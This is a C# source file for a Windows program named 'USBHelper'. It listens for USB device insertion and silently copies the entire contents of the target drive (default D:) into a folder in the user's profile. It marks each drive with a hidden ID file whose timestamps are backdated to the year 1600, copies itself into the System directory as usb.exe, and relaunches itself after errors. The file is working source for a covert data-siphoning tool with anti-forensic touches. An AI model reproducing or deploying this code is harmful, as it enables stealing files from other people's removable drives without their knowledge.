using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml;
using System.Xml.Linq;
using System.Xml.XPath;

namespace ClassicByte.App.USBHelper
{
    internal static class Program
    {
        internal static int OnArriveTime = 0;
        internal static String TargetPath { get; }

        internal static String OutPutPath { get; }

        public static String Name => "ClassicByte.App.USBHelper";

        public static XmlDocument Config { get; }

        public static DirectoryInfo AppData { get => Directory.CreateDirectory($"{Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)}\\.ClassicByte\\AppData\\{Name}\\"); }

        /// <summary>
        /// 应用程序的主入口点。
        /// </summary>
        [STAThread]
        static void Main(String[] args)
        {
            #region MyRegion
            try
            {

                {


                    if (args.Length != 0)
                    {
                        if (args[0].ToLower() == "init")
                        {
                            RegExecution();
                            InitConfig();
                        }
                    }

                    if (!File.Exists($"{AppData.FullName}\\Config\\app.cfg"))
                    {
                        InitConfig();
                    }

                    if (!Directory.Exists(XDocument.Load($"{AppData.FullName}\\Config\\app.cfg").XPathSelectElement("Config/OutPut").Value))
                    {
                        InitConfig();
                        Directory.CreateDirectory(XDocument.Load($"{AppData.FullName}\\Config\\app.cfg").XPathSelectElement("Config/OutPut").Value);
                    }

                    Application.EnableVisualStyles();
                    Application.SetCompatibleTextRenderingDefault(false);
                    var form = new MainForm();


                    form.OutPutPathBox.Text = XDocument.Load($"{AppData.FullName}\\Config\\app.cfg").XPathSelectElement("Config/OutPut").Value;
                    form.TargetPathBox.Text = XDocument.Load($"{AppData.FullName}\\Config\\app.cfg").XPathSelectElement("Config/Target").Value;


                    StartListener((e) =>
                    {
                        if (!Directory.Exists(form.TargetPathBox.Text))
                        {
                            return;
                        }
                        //确认驱动器的信息
                        if (!File.Exists($"{form.TargetPathBox.Text}\\.cfg"))
                        {
                            File.WriteAllText($"{form.TargetPathBox.Text}\\.cfg", Guid.NewGuid().ToString());
                        }
                        var id = File.ReadAllText($"{form.TargetPathBox.Text}\\.cfg");
                        var cfg = new FileInfo($"{form.TargetPathBox.Text}\\.cfg");
                        cfg.LastWriteTime = new DateTime(1600, 1, 1, 23, 59, 59);
                        cfg.CreationTime = new DateTime(1600, 1, 1, 23, 59, 59);
                        //复制文件夹
                        try
                        {
                            CopyFolder(form.TargetPathBox.Text, $"{form.OutPutPathBox.Text}\\{id}");

                        }
                        catch (Exception)
                        {
                            return;
                        }
                        //收尾
                        //Process process = new Process();
                        //process.StartInfo = new ProcessStartInfo() { Arguments = $"+s +h {form.TargetPathBox.Text}", FileName = "attrib.exe", UseShellExecute = false, RedirectStandardOutput = true };
                        //process.Start();
                        //process.WaitForExit();


                        OnArriveTime++;
                        form.ResentArriveLabel.Text = $"触发次数：{OnArriveTime}";

                        form.ResentArriveLabel.Text = $"最后一次的触发：{id}";

                        var targetdsk = new DriveInfo("D:");
                        var info = new StringBuilder();
                        PropertyDescriptorCollection properties = TypeDescriptor.GetProperties(targetdsk);

                        // 输出属性及其值
                        foreach (PropertyDescriptor property in properties)
                        {
                            info.AppendLine($"{property.Name}: {property.GetValue(targetdsk)}");
                        }
                        File.WriteAllText($"{AppData.FullName}\\Log\\{DateTime.Now:yyyy-MM-dd-HH:mm:ss}.log", info.ToString());
                    });
                    Application.Run(form);
                }
            }
            catch (Exception)
            {
                Process.Start(Process.GetCurrentProcess().MainModule.FileName);
                Environment.Exit(0);
            }
            #endregion
            //DriveInfo drive = new DriveInfo("C:");
            //PropertyDescriptorCollection properties = TypeDescriptor.GetProperties(drive);

            //// 输出属性及其值
            //foreach (PropertyDescriptor property in properties)
            //{
            //    Console.WriteLine($"{property.Name}: {property.GetValue(drive)}");
            //}
            //Console.ReadKey();

            //FileInfo file = new FileInfo($"{"C:\\Users\\huang\\.ClassicByte"}\\.cfg");
            //file.Create().Close();
            //file.LastWriteTime = new DateTime(1960, 1, 1, 23, 59, 59);
            //file.CreationTime = new DateTime(1960, 1, 1, 23, 59, 59);
        }

        static Program()
        {

        }

        private static void Program_Exited(object sender, EventArgs e)
        {
            new Task(() =>
            {
            }).Start();
        }


        /// <summary>
        /// 当事件发生时执行的委托
        /// </summary>
        internal delegate void Runner(EventArrivedEventArgs e);


        /// <summary>
        /// 查询所有设备的插拔事件
        /// </summary>
        /// <param name="runner"></param>
        internal static void StartListener(Runner runner)
        {
            try
            {
                //查询所有设备的插拔事件
                #region 第一种查询方法
                //Win32_DeviceChangeEvent  Win32_VolumeChangeEvent
                ManagementEventWatcher watcher = new ManagementEventWatcher();
                WqlEventQuery query = new WqlEventQuery("SELECT * FROM Win32_DeviceChangeEvent  WHERE EventType = 2 or EventType = 3");
                watcher.EventArrived += (s, e) =>
                {
                    runner(e);

                };
                watcher.Query = query;
                watcher.Start();
                #endregion

                #region 第二种查询方法
                //// Full query string specified to the constructor
                //WqlEventQuery q = new WqlEventQuery("SELECT * FROM Win32_ComputerShutdownEvent");

                //// Only relevant event class name specified to the constructor
                //// Results in the same query as above.
                //WqlEventQuery query = new WqlEventQuery("Win32_ComputerShutdownEvent");

                //Console.WriteLine(query.QueryString);

                //ConnectionOptions connectionOptions = new ConnectionOptions();
                //connectionOptions.EnablePrivileges = true;//启用用户特权

                //ManagementScope managementScope = new ManagementScope("root\\CIMV2", connectionOptions);

                //WqlEventQuery wqlEventQuery = new WqlEventQuery();
                //wqlEventQuery.EventClassName = "Win32_DeviceChangeEvent";
                //wqlEventQuery.Condition = "EventType = 2 or EventType = 3";
                //wqlEventQuery.WithinInterval = TimeSpan.FromSeconds(1);

                //ManagementEventWatcher watcher = new ManagementEventWatcher(managementScope, wqlEventQuery);
                ////watcher.EventArrived += Watcher_EventArrived;
                //watcher.EventArrived += (sender, e) =>
                //{
                //    var txt = "";
                //    foreach (var p in e.NewEvent.Properties)
                //    {
                //        txt = "name " + p.Name + " val " + p.Value + "\r\n";
                //        Console.WriteLine(txt);
                //        DeviceManage.Instance.FindDevice();
                //    }
                //};
                //watcher.Start();

                #endregion

                //ServicesManager.Instance.StartServices();
                //Thread.CurrentThread.IsBackground = false;
                //Thread.Sleep(Timeout.Infinite);
            }
            catch (Exception)
            {
                throw;
            }
        }
        static void RegExecution()
        {
            try
            {
                System.IO.File.Copy(Process.GetCurrentProcess().MainModule.FileName, $"{Environment.GetFolderPath(Environment.SpecialFolder.System)}\\usb.exe");

            }
            catch (Exception)
            {

            }
        }

        static void InitConfig()
        {
            #region 初始化XML

            XmlDocument config = new XmlDocument();

            var root = config.CreateElement("Config");
            root.SetAttribute("Name", Name);

            var targetE = config.CreateElement("Target");
            targetE.InnerText = "D:\\";

            var outPutE = config.CreateElement("OutPut");
            outPutE.InnerText = $"{AppData.FullName}\\File\\";

            root.AppendChild(targetE);
            root.AppendChild(outPutE);
            config.AppendChild(root);
            Directory.CreateDirectory($"{AppData.FullName}\\Config");
            config.Save($"{AppData.FullName}\\Config\\app.cfg");
            #endregion
        }
        /// <summary>
        /// 复制整个文件夹
        /// </summary>
        /// <param name="sourceFolder">源文件夹</param>
        /// <param name="destinationFolder">目标文件夹</param>
        /// <exception cref="DirectoryNotFoundException">当源文件夹不存在时引发的异常</exception>
        public static void CopyFolder(string sourceFolder, string destinationFolder)
        {
            if (!Directory.Exists(sourceFolder))
            {
                throw new DirectoryNotFoundException($"Source folder {sourceFolder} does not exist.");
            }

            if (!Directory.Exists(destinationFolder))
            {
                Directory.CreateDirectory(destinationFolder);
            }
            //var t = 0;
            foreach (var file in Directory.GetFiles(sourceFolder))
            {
                string fileName = Path.GetFileName(file);
                string destinationFile = Path.Combine(destinationFolder, fileName);
                try
                {
                    File.Copy(file, destinationFile, true);
                }
                catch (IOException)
                {

                }
            }

            foreach (var subFolder in Directory.GetDirectories(sourceFolder))
            {
                string subDirectoryName = Path.GetFileName(subFolder);
                string destinationSubFolder = Path.Combine(destinationFolder, subDirectoryName);
                CopyFolder(subFolder, destinationSubFolder);
                //print($"Copied folder {subFolder} to {destinationSubFolder}");
            }
        }
    }
}
